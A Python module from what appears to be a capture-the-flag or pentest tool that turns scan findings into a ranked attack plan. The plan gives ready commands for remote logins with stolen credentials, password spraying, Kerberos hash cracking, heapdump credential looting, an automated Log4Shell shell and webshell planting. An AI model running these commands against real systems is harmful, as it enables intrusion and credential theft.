"""The brain — a rule-based decision layer that ranks what to do next.

scryer emits a lot of findings; the operator wants the two or three that
actually move toward a flag. This module reads the finished HostReport and
synthesises a short, ranked ATTACK PLAN: the highest-leverage moves first, each
with concrete copy-paste commands, and the low-value noise suppressed.

It is deterministic and offline — the always-on rules core of the agent. When a
local LLM is available (see aiadvisor), its suggestion is folded in on top; the
plan here stands on its own without it.

Ranks (lower = do sooner):
  0  flags captured (report them)
  1  a shell / valid credential is in hand -> cash it in
  2  a credential leak / crackable hash -> turn it into access
  3  anonymous access with a concrete next step (shares, exports, panels)
  4  a known vuln / version lead
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import List

from . import utils
from .report import HostReport


@dataclass
class Move:
    rank: int
    title: str
    why: str = ""
    cmds: List[str] = field(default_factory=list)


def build(host: HostReport) -> List[Move]:
    moves: List[Move] = []
    ip = host.resolved_ip or host.target
    ports = {e["port"] for e in host.open_ports}
    titles = [f.title.lower() for f in host.findings]

    def has(*subs) -> bool:
        """True if any finding title contains any of the given substrings."""
        return any(s.lower() in t for s in subs for t in titles)

    # 0 — flags
    flags = _distinct(f.detail or f.title for f in host.findings
                      if f.category == "flag")
    if flags:
        moves.append(Move(0, f"{len(flags)} flag(s) captured",
                          "verify + submit", flags))

    # 1 — shell / RCE / valid credential already proven
    if has("RCE via", "xp_cmdshell", "Shell via", "reverse shell",
           "Valid AD credential"):
        cmds = []
        if has("Valid AD credential", "credential from command", "psexec",
               "wmiexec") and _win(ports):
            cmds += [f"impacket-wmiexec <user>:'<pass>'@{ip}   # or -hashes :<nt>",
                     f"evil-winrm -i {ip} -u <user> -p '<pass>'"]
        moves.append(Move(1, "You have code-exec / a valid login — cash it in",
                          "read the user + root flag, then dump for persistence",
                          cmds or [f"revisit the RCE finding above on {ip}"]))

    # 1 — recovered plaintext creds -> authenticate everywhere
    if host.creds:
        cmds = []
        c = host.creds[0]
        if _win(ports):
            cmds.append(f"netexec smb {ip} -u <user> -p '{c}' --shares   # + winrm/mssql")
            cmds.append(f"evil-winrm -i {ip} -u <user> -p '{c}'")
        if 22 in ports:
            cmds.append(f"sshpass -p '{c}' ssh <user>@{ip}")
        if {80, 443, 8080, 8443} & ports:
            cmds.append("reuse on every web login panel found")
        moves.append(Move(1, f"Spray {len(host.creds)} recovered credential(s)",
                          "password reuse is the usual pivot: "
                          + ", ".join(host.creds[:6]), cmds))

    # 2 — crackable Kerberos / hashes
    if has("AS-REP roastable", "Kerberoast", "krb5"):
        moves.append(Move(2, "Crack the Kerberos hash(es) you roasted",
                          "offline, no lockout",
                          ["hashcat -m 18200 asrep.txt rockyou.txt   # AS-REP",
                           "hashcat -m 13100 tgs.txt rockyou.txt     # Kerberoast"]))
    if has("Hard-coded hash", "hash in "):
        moves.append(Move(2, "Crack the recovered hash(es)",
                          "try rules + a bigger list",
                          ["hashcat -m 0 hash.txt rockyou.txt -r best64.rule"]))

    # 2 — credential leaks worth chasing
    if has("heapdump", "actuator", "Spring Boot"):
        moves.append(Move(2, "Loot the Spring Boot actuator",
                          "the heapdump / env holds DB creds + tokens",
                          [f"curl -sk http://{ip}/actuator/heapdump -o heap.hprof",
                           "JDumpSpider heap.hprof   # or strings | grep -i pass"]))
    if has("Log4Shell"):
        moves.append(Move(1, "Exploit Log4Shell (CVE-2021-44228)",
                          "scryer has the parameterised chain in the finding above",
                          [f"scryer {ip} --exploit   # auto rogue-jndi + shell"]))
    if has("writable", "S3 bucket", "bucket"):
        moves.append(Move(2, "Exploit the writable bucket -> webshell",
                          "", [f"scryer {ip} --exploit"]))

    # 3 — anonymous access with a concrete next step
    for f in host.findings:
        if "Readable SMB share" in f.title:
            share = f.title.split(":")[-1].strip() or "<share>"
            moves.append(Move(3, f"Loot SMB share {share}",
                              "recurse for creds/configs/flags",
                              [f"smbclient -N //{ip}/{share} -c 'recurse ON; ls'"]))
            break
    if has("NFS export"):
        moves.append(Move(3, "Mount the NFS export",
                          "", [f"showmount -e {ip}",
                               f"sudo mount -t nfs {ip}:/<export> /mnt"]))
    if has("Anonymous LDAP") and not host.creds:
        moves.append(Move(3, "Drive the AD chain to creds",
                          "enum users -> AS-REP roast -> spray; then BloodHound",
                          [f"scryer {ip} --exploit   # adattack runs this",
                           f"nxc ldap {ip} -u '' -p '' --users"]))
    if has("login", "panel", "SQL injection", "upload"):
        moves.append(Move(3, "Attack the web app surface",
                          "authenticated area / injection / upload",
                          ["sqlmap -u '<url>' --batch --dbs   # or the panel"]))

    # 4 — version leads
    if has("Exploit-DB", "searchsploit", "CVE"):
        moves.append(Move(4, "Chase the version-based exploit lead", "", []))

    moves.sort(key=lambda m: m.rank)
    return _dedupe(moves)


def render_console(host: HostReport) -> None:
    moves = build(host)
    if not moves:
        return
    print("\n" + utils.c("┌─[ ATTACK PLAN  (ranked — do these first) ]"
                         + "─" * 20, utils.C.MAGENTA, utils.C.BOLD))
    for i, m in enumerate(moves[:8], 1):
        colour = utils.C.GREEN if m.rank == 0 else (
            utils.C.RED if m.rank == 1 else utils.C.YELLOW)
        print("  " + utils.c(f"{i}. {m.title}", colour, utils.C.BOLD)
              + (utils.c(f"   — {m.why}", utils.C.GREY) if m.why else ""))
        for cmd in m.cmds[:4]:
            print("     " + utils.c(cmd, utils.C.CYAN))
    print()


def _win(ports) -> bool:
    return bool({445, 5985, 3389, 88} & ports)


def _distinct(it):
    out, seen = [], set()
    for x in it:
        if x and x not in seen:
            seen.add(x)
            out.append(x)
    return out


def _dedupe(moves: List[Move]) -> List[Move]:
    out, seen = [], set()
    for m in moves:
        if m.title not in seen:
            seen.add(m.title)
            out.append(m)
    return out
